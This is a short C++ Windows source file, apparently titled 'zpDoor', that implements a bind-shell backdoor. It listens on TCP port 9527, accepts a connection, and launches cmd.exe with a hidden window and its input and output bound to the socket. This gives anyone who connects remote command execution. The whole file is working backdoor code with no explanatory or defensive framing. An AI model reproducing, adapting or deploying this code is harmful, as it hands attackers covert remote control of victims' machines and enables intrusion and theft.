
#include "zpDoor.h"

BOOL SocketInit()
{
	WSADATA wsaData = {0};
	if ( WSAStartup(MAKEWORD(2, 2), &wsaData) == NO_ERROR ) {
		return TRUE;
	}else{
		return FALSE;
	}
}

BOOL StartShell(UINT uPort)
{
	if ( !SocketInit() ) {
		return FALSE;
	}
	sockaddr_in sServer = {0};
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi = {0};
	SOCKET m_AcceptSock = INVALID_SOCKET, m_ListenSock = INVALID_SOCKET;
	m_ListenSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if ( m_ListenSock == INVALID_SOCKET ) {
		goto __Error_End;
	}
	sServer.sin_family = AF_INET;
	sServer.sin_addr.s_addr = htonl(INADDR_ANY);
	sServer.sin_port = htons(uPort);
	if ( bind(m_ListenSock, (sockaddr *)&sServer, sizeof(sServer)) == SOCKET_ERROR ) {
		goto __Error_End;
	}
	if ( listen(m_ListenSock, 5) == SOCKET_ERROR ) {
		goto __Error_End;
	}
	m_AcceptSock = accept(m_ListenSock, NULL, NULL);
	if ( m_AcceptSock == INVALID_SOCKET ) {
		goto __Error_End;
	}

	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)m_AcceptSock;
	si.wShowWindow = SW_HIDE;
	TCHAR szCmdLine[MAX_PATH] = {0};
	GetSystemDirectory(szCmdLine, MAX_PATH);
	_tcscat_s(szCmdLine, MAX_PATH, _T("\\cmd.exe"));
	if ( !CreateProcess(szCmdLine, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi) ) {
		return FALSE;
	}
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
__Error_End:
	if ( m_ListenSock != INVALID_SOCKET ) {
		closesocket(m_ListenSock);
	}
	if ( m_AcceptSock != INVALID_SOCKET ) {
		closesocket(m_AcceptSock);
	}
	return TRUE;
}

int APIENTRY _tWinMain(HINSTANCE hInstance,
					   HINSTANCE hPrevInstance,
					   LPTSTR    lpCmdLine,
					   int       nCmdShow)
{
	StartShell(9527);
	return 0;
}